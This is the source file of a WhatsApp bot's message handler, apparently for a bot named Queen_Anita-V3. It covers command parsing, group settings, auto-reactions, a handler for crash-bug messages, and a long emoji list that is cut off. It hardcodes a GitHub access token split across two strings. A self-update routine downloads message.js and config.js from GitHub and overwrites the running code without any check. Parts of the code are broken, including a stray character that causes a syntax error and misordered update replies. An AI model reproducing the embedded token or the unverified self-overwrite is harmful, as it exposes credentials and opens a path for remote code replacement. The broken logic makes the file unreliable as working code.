
require('./config')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, SecondNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const emojiRegex = require('emoji-regex');
const { v4: uuidv4 } = require('uuid')

const antispam = require("./database/antispam");

    const chalk = require("chalk");

const { exec, spawn, execSync } = require("child_process")
const fsx = require('fs-extra')
const util = require('util')
const fetch = require('node-fetch')
const FormData = require('form-data')
const axios = require('axios')
const cheerio = require('cheerio')
const { performance } = require("perf_hooks");
const { TelegraPH } = require("./lib/TelegraPH")
const { remini, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik, webp2mp4File } = require("./lib/scraper")
const uploadImage = require('./lib/uploadImage')
const process = require('process');
const moment = require("moment-timezone")
const os = require('os');
const checkDiskSpace = require('check-disk-space').default;
const speed = require('performance-now')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4800)
const { jadibots, connss } = require("./jadibots")
const { jadibot, conns } = require("./jadibot")
const textpro = require('./scrape/textpro') 
const { shannzCdn } = require('./lib/shannzCdn.js'); 
const { addExif } = require('./lib/exif')
const fs = require("fs")
const { generateWAMessage, useMultiFileAuthState, areJidsSameUser, makeWaSocket, proto, downloadContentFromMessage, prepareWAMessageMedia, generateWAMessageFromContent, generateWAMessageContent} = require("@whiskeysockets/baileys")

const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')

const { bytesToSize, checkBandwidth, formatSize, jsonformat, nganuin, pickRandom, runtime, shorturl, formatp, color, getGroupAdmins } = require("./lib/myfunc");

const own = JSON.parse(fs.readFileSync('./database/owner.json').toString()) 
let nplink = JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let nplinkwarn = JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let nplinkgc = JSON.parse(fs.readFileSync('./database/antilinkall.json')); 
const {
    formatDate,
    getTime,
    isUrl,
    await,
    sleep,
    clockString,
    msToDate,
    sort,
    toNumber,
    enumGetKey,
    fetchJson,
    getBuffer,
    json,
    delay,
    format,
    logic,
    generateProfilePicture,
    parseMention,
    getRandom,
    fetchBuffer,
    buffergif,
    totalcase
} = require('./system/myfunc')



module.exports = ptz = async (ptz, m, chatUpdate, store) => {
try {
const body = (m && m?.mtype) ? (
m?.mtype === 'conversation' ? m?.message?.conversation :
m?.mtype === 'imageMessage' ? m?.message?.imageMessage?.caption :
m?.mtype === 'videoMessage' ? m?.message?.videoMessage?.caption :
m?.mtype === 'extendedTextMessage' ? m?.message?.extendedTextMessage?.text :
m?.mtype === 'buttonsResponseMessage' ? m?.message.buttonsResponseMessage.selectedButtonId :
m?.mtype === 'listResponseMessage' ? m?.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
m?.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m?.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
m?.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m?.msg.selectedId, chatUpdate) :
m?.mtype === 'messageContextInfo' ? (m?.message.buttonsResponseMessage?.selectedButtonId || m?.message.listResponseMessage?.singleSelectReply.selectedRowId || m?.text) :
    ''
) : '';
 async function appenTextMessage(text, chatUpdate) {
        let messages = await generateWAMessage(m?.chat, { text: text, mentions: m?.mentionedJid }, {
            userJid: ptz.user.id,
            quoted:m?.quoted && m?.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m?.sender, ptz.user.id)
        messages.key.id = m?.key.id
        messages.pushName = m?.pushName
        if (m?.isGroup) messages.participant = m?.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'}
ptz.ev.emit('messages.upsert', msg)}       
 /*const body = (
    m?.mtype === 'conversation' ? m?.message.conversation :
    m?.mtype === 'imageMessage' ? m?.message.imageMessage.caption :
    m?.mtype === 'videoMessage' ? m?.message.videoMessage.caption :
    m?.mtype === 'extendedTextMessage' ? m?.message.extendedTextMessage.text :
    m?.mtype === 'buttonsResponseMessage' ? m?.message.buttonsResponseMessage.selectedButtonId :
    m?.mtype === 'listResponseMessage' ? m?.message.listResponseMessage.singleSelectReply.selectedRowId :
    m?.mtype === 'templateButtonReplyMessage' ? m?.message.templateButtonReplyMessage.selectedId :
    m?.mtype === 'interactiveResponseMessage' ? appenTextMessage(JSON.parse(m?.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) :
    m?.mtype === 'templateButtonReplyMessage' ? appenTextMessage(m?.msg.selectedId, chatUpdate) :
    m?.mtype === 'messageContextInfo' ? (m?.message.buttonsResponseMessage?.selectedButtonId || m?.message.listResponseMessage?.singleSelectReply.selectedRowId || m?.text) :
    ''
);   */
const budy = (m && typeof m?.text === 'string') ? m?.text : '';
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m?.pushName || "No Name";
const botNumber = await ptz.decodeJid(ptz.user.id);
const isCreator = (m && m?.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m?.sender)) || false;
const isPrivate = m?.fromMe || m?.author == null;    
const itsMe = (m && m?.sender && m?.sender == botNumber) || false;
const text = q = args.join(" ");
const frommeky = m.key.remoteJid    
const fatkuns = m && (m?.quoted || m);
const isAntiLink = nplink.includes(m.chat) ? true : false 

const isAntiLinkwarn = nplinkwarn.includes(m.chat) ? true : false 

const isAntiLinkremove = nplinkgc.includes(m.chat) ? true : false  
const translate = require('@vitalets/google-translate-api')
const quoted = (fatkuns?.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] :
(fatkuns?.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] :
(fatkuns?.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] :
m?.quoted || m;
const mime = ((quoted?.msg || quoted) || {}).mimetype || '';
const qmsg = (quoted?.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);
//group
const isAntiLinkgc = nplinkgc.includes(m.chat) ? true : false 
const groupMetadata = m?.isGroup ? await ptz.groupMetadata(m?.chat).catch(e => {}) : {};
const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
const participants = m?.isGroup ? await groupMetadata.participants || [] : [];
const groupAdmins = m?.isGroup ? await getGroupAdmins(participants) || [] : [];
const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = m?.isGroup ? groupAdmins.includes(m?.sender) : false;
const groupOwner = m?.isGroup ? groupMetadata.owner || '' : '';
const isGroupOwner = m?.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m?.sender) : false;
const isGroup = m.key.remoteJid.endsWith('@g.us')
//================== [ TIME ] ==================//
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')



const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = `Good Night Sir !! `
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = `Good Evening Sir !!`
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = `Good Evening Sir !!`
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = `Good Afternoon Sir !!`
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = `Good Afternoon Sir !!`
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = `Good Morning Sir !!`
 }
  
if (isCmd && !m.key.fromMe && antispam) {
if (antispam.isFiltered(m.sender)) return reply('*( Anti Spam )* Tolong berikan jeda 5 detik.')
antispam.addFilter(m.sender)
} 

if (m?.type === "paymentMessage"){
console.log(color('[DETECTED]', 'red'), color('Received a live location bug!', 'yellow'));
      
        // Step 1: Delete the message
        ptz.chatModify({
            delete: true,
            lastMessages: [{
                key: m.key,
                messageTimestamp: m.messageTimestamp
            }],
        }, m.chat);
      
        // Step 4: Notify the owner
        ptz.sendMessage(`${pushname}@s.whatsapp.net`, {
            text: `Hi Owner! wa.me/${m.sender.split("@")[0]} has been detected sending a live location bug in a private chat.`
        });
        
        ptz.sendMessage(m.chat, {
            text: `*MARK AS READ*\n\n\n\n\n *Bug sender here👇:* \nwa.me/${m.sender.split("@")[0]}`
        });
   
} 





 

// GitHub repo details


const messageFilePath = './message.js';  // The path to message.js
const configFilePath = './config.js';    // The path to config.js
const first = 'ghp_Z3XIiApZNTCZ'; 
const second1 = 'UOsJZAz4kM0uidUPgP3g8AEJ';
const GITHUB_TOKEN = `${first}`+`${second1}`;
const owner = 'DeeCeeXxx';  // Replace with the correct repository owner
const repo = 'Queen_Anita-V3';  // Replace with the correct repository name

async function checkForUpdates() {
    const url = `https://api.github.com/repos/${owner}/${repo}/commits`;

    try {
        // Fetch the latest commits from the GitHub repository with authentication
        const response = await axios.get(url, {
            headers: {
                'Authorization': `token ${GITHUB_TOKEN}`,
            },
        });

        // Get the latest commit SHA
        const latestCommit = response.data[0].sha;

        // Read the current commit SHA stored in the file, if it exists
        let currentCommit = '';
        try {
            currentCommit = await fs.readFile('./current_commit.txt', 'utf8');
        } catch (readError) {
            console.log('No current_commit.txt found, assuming first run.');
        }

        // Compare the latest commit with the current one
        if (latestCommit !== currentCommit) {
            // Notify that an update is available
            await reply('Update available! Downloading the update...');

await reply('Update Completed...');
 
            // Download and update both files
            await downloadUpdate(latestCommit, 'message.js', messageFilePath);
            await downloadUpdate(latestCommit, 'config.js', configFilePath);

            // Save the new commit SHA to the file
            await fs.writeFile('./current_commit.txt', latestCommit, 'utf8');
        } else {
            await reply('You are using the latest version of Queen_Anita-V3');
        }
    } catch (error) {
        console.error('Error checking for updates:', error.message);
        await reply('No updates available. You are using the latest version of Queen_Anita-V3.');o
    }
}

async function downloadUpdate(commitSha, fileName, filePath) {
    const fileUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${commitSha}/${fileName}`;

    try {
        // Download the updated file
        const response = await axios.get(fileUrl);
        
        // Save the updated file
        fs.writeFileSync(filePath, response.data);  // Overwrite the current file with the updated content
        
        console.log(`${fileName} updated successfully.`);
    } catch (error) {
        console.error(`Error downloading the update for ${fileName}:`, error);
        await reply(`Failed to download the update for ${fileName}. Please try again later.`);
    }
}




 
 

 //wapresence
 	
        //unavailable
         if (global.autoreadmessages) {
        	if (m.message) { 
            ptz.readMessages([m.key])
        }
       } 
        
        if (global.unavailable) {
        	if (m.message) { 
        	ptz.sendPresenceUpdate('unavailable', m.chat)
        }
       } 	
 	
 if (global.autoRecord) {
      if (m.message) {
        ptz.sendPresenceUpdate("recording", m.chat);
      }
    }

    if (global.autoTyping) {
      if (m.message) {
        ptz.sendPresenceUpdate("composing", m.chat);
      }
    }

    if (global.available) {
      if (m.message) {
        ptz.sendPresenceUpdate("available", m.chat);
      }
    }
    



 	
if (global.autoreact) {   
if (m.message) {
  try {
    // Array of random emojis
    const emojis = ["😊", "👍", "😂", "💯", "🔥", "🙏", "🎉", "👏", "😎", "🤖", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸",
"📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑",
"👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿",
"🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆",
"🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜",
"🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐",
"🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣",
"🏥", "🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮",
"🏯", "🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️",
"🕸️", "💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱",
"👨", "👩", "👧", "👦", "👪", "👫", "👭", "👬", "👮", "🕴️",
"💼", "📊", "📈", "📉", "📊", "📝", "📚", "📰", "📱", "💻",
"📻", "📺", "🎬", "📽️", "📸", "📷", "🕯️", "💡", "🔦", "🔧",
"🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻",
"👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼",
"🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟",
"🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛",
"🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵",
"🏰", "🏠", "🏡", "🏢", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩", "🏪",
"🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁", "🚀",
"🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫", "🚽",
"🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️",
"👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪", "👫",
"👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊", "📝",
"📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸", "📷",
"🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑", "👸",
"🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿", "🦁",
"🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇",
"🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙", "🐚", "🐜", "🐝",
"🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿", "🌸", "💐", "🌹",
"🌺", "🌻", "🌴", "🏵", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥",
"🏦", "🏧", "🏨", "🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯",
"🚣", "🛥", "🚂", "🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺",
"🚮", "🚯", "🚱", "🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️",
"💀", "👻", "🕺", "💃", "🕴️", "👶", "👵", "👴", "👱", "👨",
"👩", "👧", "👦", "👪", "🙂", "😑", "🤣", "😍", "😘", "😗", "😙", "😚", "😛", "😝",
"😞", "😟", "😠", "😡", "😢", "😭", "😓", "😳", "😴", "😌",
"😆", "😂", "🤔", "😒", "😓", "😶", "🙄", "🐶", "🐱", "🐔",
"🐷", "🐴", "🐲", "🐸", "🐳", "🐋", "🐒", "🐑", "🐕", "🐩",
"🍔", "🍕", "🥤", "🍣", "🍲", "🍴", "🍽", "🍹", "🍸", "🎂",
"📱", "📺", "📻", "🎤", "📚", "💻", "📸", "📷", "❤️", "💔",
"❣️", "☀️", "🌙", "🌃", "🏠", "🚪", "🇺🇸", "🇬🇧", "🇨🇦",
"🇦🇺", "🇯🇵", "🇫🇷", "🇪🇸", "👍", "👎", "👏", "👫", "👭",
"👬", "👮", "🤝", "🙏", "👑", "🌻", "🌺", "🌸", "🌹", "🌴",
"🏞️", "🌊", "🚗", "🚌", "🛣️", "🛫️", "🛬️", "🚣", "🛥",
"🚂", "🚁", "🚀", "🏃‍♂️", "🏋️‍♀️", "🏊‍♂️", "🏄‍♂️", "🎾",
"🏀", "🏈", "🎯", "🏆", "🎲", "⬆️", "⬇️", "⇒", "⇐", "↩️",
"↪️", "ℹ️", "‼️", "⁉️", "‽️", "©️", "®️", "™️", "🔴", "🔵",
"🟢", "🔹", "🔺", "💯", "👑", "🤣", "🤷‍♂️", "🤷‍♀️", "🙅‍♂️",
"🙅‍♀️", "🙆‍♂️", "🙆‍♀️", "🤦‍♂️", "🤦‍♀️", "🏻", "💆‍♂️",
"💆‍♀️", "🕴‍♂️", "🕴‍♀️", "💇‍♂️", "💇‍♀️", "🚫", "🚽", "🕳️",
"💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃", "🕴️",
"👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪",
"👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉",
"📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬",
"📽️", "📸", "📷", "🕯️", "💡", "🔦", "�", "🏯", "🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨",
"🏩", "🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂",
"🚁", "🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱",
"🚫", "🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺",
"💃", "🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦",
"👪", "👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉",
"📊", "📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️",
"📸", "📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫",
"👑", "👑", "👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽",
"🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄",
"🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠", "🐡", "🐙",
"🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌", "🐚", "🌿",
"🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🌳", "🌲", "🌾", "🌿",
"🍃", "🍂", "🍃", "🌻", "💐", "🌹", "🌺", "🌸", "🌴", "🏵",
"🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌", "🎲",
"📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟", "🌠",
"🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫", "🌬",
"🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩",
"🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬", "🌩", "🌨",
"🌧", "🌦", "🌥", "🌡", "🌱", "🌿", "🍃", "🍂", "🌻", "💐", "🌹", "🌺", "🌸", "🌴",
"🏵", "🎀", "🏆", "🏈", "🏉", "🎯", "🏀", "🏊", "🏋", "🏌",
"🎲", "📚", "📖", "📜", "📝", "💭", "💬", "🗣", "💫", "🌟",
"🌠", "🎉", "🎊", "👏", "💥", "🔥", "💥", "🌪", "💨", "🌫",
"🌬", "🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🌪", "🌫", "🌬",
"🌩", "🌨", "🌧", "🌦", "🌥", "🌡", "🕯️", "💡", "🔦", "🔧",
"🔨", "🔩", "🔪", "🔫", "👑", "👸", "🤴", "👹", "🤺", "🤻",
"👺", "🤼", "🤽", "🤾", "🤿", "🦁", "🐴", "🦊", "🐺", "🐼",
"🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟",
"🐠", "🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛",
"🐌", "🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵",
"🏰", "🏠", "🏡", "🏢", "🏣", "🏥", "🏦", "🏧", "🏨", "🏩",
"🏪", "🏫", "🏬", "🏭", "🏮", "🏯", "🚣", "🛥", "🚂", "🚁",
"🚀", "🛸", "🛹", "🚴", "🚲", "🛺", "🚮", "🚯", "🚱", "🚫",
"🚽", "🕳️", "💣", "🔫", "🕷️", "🕸️", "💀", "👻", "🕺", "💃",
"🕴️", "👶", "👵", "👴", "👱", "👨", "👩", "👧", "👦", "👪",
"👫", "👭", "👬", "👮", "🕴️", "💼", "📊", "📈", "📉", "📊",
"📝", "📚", "📰", "📱", "💻", "📻", "📺", "🎬", "📽️", "📸",
"📷", "🕯️", "💡", "🔦", "🔧", "🔨", "🔩", "🔪", "🔫", "👑",
"👸", "🤴", "👹", "🤺", "🤻", "👺", "🤼", "🤽", "🤾", "🤿",
"🦁", "🐴", "🦊", "🐺", "🐼", "🐾", "🐿", "🦄", "🦅", "🦆", "🦇", "🦈", "🐳", "🐋", "🐟", "🐠",
"🐡", "🐙", "🐚", "🐜", "🐝", "🐞", "🕷️", "🦋", "🐛", "🐌",
"🐚", "🌿", "🌸", "💐", "🌹", "🌺", "🌻", "🌴", "🏵", "🏰", "🐒", "🦍", "🦧", "🐶", "🐕", "🦮", "🐕‍🦺", "🐩", "🐺", "🦊",
"🦝", "🐱", "🐈", "🐈‍⬛", "🦁", "🐯", "🐅", "🐆", "🐴", "🐎",
"🦄", "🦓", "🦌", "🦬", "🐮", "🐂", "🐃", "🐄", "🐷", "🐖",
"🐗", "🐽", "🐏", "🐑", "🐐", "🐪", "🐫", "🦙", "🦒", "🐘",
"🦣", "🦏", "🦛", "🐭", "🐁", "🐀", "🐹", "🐰", "🐇", "🐿️",
"🦫", "🦔", "🦇", "🐻", "🐻‍❄️", "🐨", "🐼", "🦥", "🦦", "🦨",
"🦘", "🦡", "🐾", "🦃", "🐔", "🐓", "🐣", "🐤", "🐥", "🐦",
"🐧", "🕊️", "🦅", "🦆", "🦢", "🦉", "🦤", "🪶", "🦩", "🦚",
"🦜", "🐸", "🐊", "🐢", "🦎", "🐍", "🐲", "🐉", "🦕", "🦖",
"🐳", "🐋", "🐬", "🦭", "🐟", "🐠", "😀", "😃", "😄", "😁", "😆", "😅", "🤣", "😂", "🙂", "🙃",
"😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "☺️", "😚",
"😙", "🥲", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭",
"🤫", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😶‍🌫️", "😏", "😒",
"🙄", "😬", "😮‍💨", "🤥", "😌", "😔", "😪", "🤤", "😴", "😷",
"🤒", "🤕", "🤢", "🤮", "🤧", "🥵", "🥶", "🥴", "😵", "😵‍💫",
"🤯", "🤠", "🥳", "🥸", "😎", "🤓", "🧐", "😕", "😟", "🙁",
"☹️", "😮", "😯", "😲", "😳", "🥺", "😦", "😧", "😨", "😰",
"😥", "😢", "😭", "😱", "😖", "😣", "😞", "😓", "😩", "😫",
"🥱", "😤", "😡", "😠", "🤬", "😈", "👿", "💀", "☠️", "💩",
"🤡", "👹", "👺", "👻", "👽", "👾", "🤖", "😺", "😸", "😹",
"😻", "😼", "😽", "🙀", "😿", "😾", "🙈", "🙉", "🙊", "💋",
"💌", "💘", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "❣️",
"💔", "❤️‍🔥", "❤️‍🩹", "❤️", "🧡", "💛", "💚", "💙", "💜", "🤎",
"🖤", "🤍", "💯", "💢", "💥", "💫", "💦", "💨", "🕳️", "💣",
"💬", "👁️‍🗨️", "🗨️", "🗯️", "💭", "💤", "👋", "🤚", "🖐️", "✋",
"🖖", "👌", "🤌", "🤏", "✌️", "🤞", "🤟", "🤘", "🤙", "👈",
"👉", "👆", "🖕", "👇", "☝️", "👍", "👎", "✊", "👊", "🤛",
"🤜", "👏", "🙌", "👐", "🤲", "🤝", "🙏", "✍️", "💅", "🤳",
"💪", "🦾", "🦿", "🦵", "🦶", "👂", "🦻", "👃", "🧠", "🫀",
"🫁", "🦷", "🦴", "👀", "👁️", "👅", "👄", "👶", "🧒", "👦",
"👧", "🧑", "👱", "👨", "🧔", "🧔‍♂️", "🧔‍♀️", "👨‍🦰", "👨‍🦱", "👨‍🦳",
"👨‍🦲", "👩", "👩‍🦰", "🧑‍🦰", "👩‍🦱", "🧑‍🦱", "👩‍🦳", "🧑‍🦳", "👩‍🦲", "🧑‍🦲",
"👱‍♀️", "👱‍♂️", "🧓", "👴", "👵", "🙍", "🙍‍♂️", "🙍‍♀️", "🙎", "🙎‍♂️",
"🙎‍♀️", "🙅", "🙅‍♂️", "🙅‍♀️", "🙆", "🙆‍♂️", "🙆‍♀️", "💁", "💁‍♂️", "💁‍♀️",
"🙋", "🙋‍♂️", "🙋‍♀️", "🧏", "🧏‍♂️", "🧏‍♀️", "🙇", "🙇‍♂️", "🙇‍♀️", "🤦",
"🤦‍♂️", "🤦‍♀️", "🤷", "🤷‍♂️", "🤷‍♀️", "🧑‍⚕️", "👨‍⚕️", "👩‍⚕️", "🧑‍🎓", "👨‍🎓",
"👩‍🎓", "🧑‍🏫", "👨‍🏫", "👩‍🏫", "🧑‍⚖️", "👨‍⚖️", "👩‍⚖️", "🧑‍🌾", "👨‍🌾", "👩‍🌾",
"🧑‍🍳", "👨‍🍳", "👩‍🍳", "🧑‍🔧", "👨‍🔧", "👩‍🔧", "🧑‍🏭", "👨‍🏭", "👩‍🏭", "🧑‍💼",
"👨‍💼", "👩‍💼", "🧑‍🔬", "👨‍🔬", "👩‍🔬", "🧑‍💻", "👨‍💻", "👩‍💻", "🧑‍🎤", "👨‍🎤",
"👩‍🎤", "🧑‍🎨", "👨‍🎨", "👩‍🎨", "🧑‍✈️", "👨‍✈️", "👩‍✈️", "🧑‍🚀", "👨‍🚀", "👩‍🚀",
"🧑‍🚒", "👨‍🚒", "👩‍🚒", "👮", "👮‍♂️", "👮‍♀️", "🕵️", "🕵️‍♂️", "🕵️‍♀️", "💂",
"💂‍♂️", "💂‍♀️", "🥷", "👷", "👷‍♂️", "👷‍♀️", "🤴", "👸", "👳", "👳‍♂️",
"👳‍♀️", "👲", "🧕", "🤵", "🤵‍♂️", "🤵‍♀️", "👰", "👰‍♂️", "👰‍♀️", "🤰",
"🤱", "👩‍🍼", "👨‍🍼", "🧑‍🍼", "👼", "🎅", "🤶", "🧑‍🎄", "🦸", "🦸‍♂️",
"🦸‍♀️", "🦹", "🦹‍♂️", "🦹‍♀️", "🧙", "🧙‍♂️", "🧙‍♀️", "🧚", "🧚‍♂️", "🧚‍♀️",
"🧛", "🧛‍♂️", "🧛‍♀️", "🧜", "🧜‍♂️", "🧜‍♀️", "🧝", "🧝‍♂️", "🧝‍♀️", "🧞",
"🧞‍♂️", "🧞‍♀️", "🧟", "🧟‍♂️", "🧟‍♀️", "💆", "💆‍♂️", "💆‍♀️", "💇", "💇‍♂️",
"💇‍♀️", "🚶", "🚶‍♂️", "🚶‍♀️", "🧍", "🧍‍♂️", "🧍‍♀️", "🧎", "🧎‍♂️", "🧎‍♀️",
"🧑‍🦯", "👨‍🦯", "👩‍🦯", "🧑‍🦼", "👨‍🦼", "👩‍🦼", "🧑‍🦽", "👨‍🦽", "👩‍🦽", "🏃",
"🏃‍♂️", "🏃‍♀️", "💃", "🕺", "🕴️", "👯", "👯‍♂️", "👯‍♀️", "🧖", "🧖‍♂️",
"🧖‍♀️", "🧗", "🧗‍♂️", "🧗‍♀️", "🤺", "🏇", "⛷️", "🏂", "🏌️", "🏌️‍♂️",
"🏌️‍♀️", "🏄", "🏄‍♂️", "🏄‍♀️", "🚣", "🚣‍♂️", "🚣‍♀️", "🏊", "🏊‍♂️", "🏊‍♀️",
"⛹️", "⛹️‍♂️", "⛹️‍♀️", "🏋️", "🏋️‍♂️", "🏋️‍♀️", "🚴", "🚴‍♂️", "🚴‍♀️", "🚵",
"🚵‍♂️", "🚵‍♀️", "🤸", "🤸‍♂️", "🤸‍♀️", "🤼", "🤼‍♂️", "🤼‍♀️", "🤽", "🤽‍♂️",
"🤽‍♀️", "🤾", "🤾‍♂️", "🤾‍♀️", "🤹", "🤹‍♂️", "🤹‍♀️", "🧘", "🧘‍♂️", "🧘‍♀️",
"🛀", "🛌", "🧑‍🤝‍🧑", "👭", "👫", "👬", "💏", "👩‍❤️‍💋‍👨", "👨‍❤️‍💋‍👨", "👩‍❤️‍💋‍👩",
"💑", "👩‍❤️‍👨", "👨‍❤️‍👨", "👩‍❤️‍👩", "👪", "👨‍👩‍👦", "👨‍👩‍👧", "👨‍👩‍👧‍👦", "👨‍👩‍👦‍👦", "👨‍👩‍👧‍👧",
"👨‍👨‍👦", "👨‍👨‍👧", "👨‍👨‍👧‍👦", "👨‍👨‍👦‍👦", "👨‍👨‍👧‍👧", "👩‍👩‍👦", "👩‍👩‍👧", "👩‍👩‍👧‍👦", "👩‍👩‍👦‍👦", "👩‍👩‍👧‍👧",
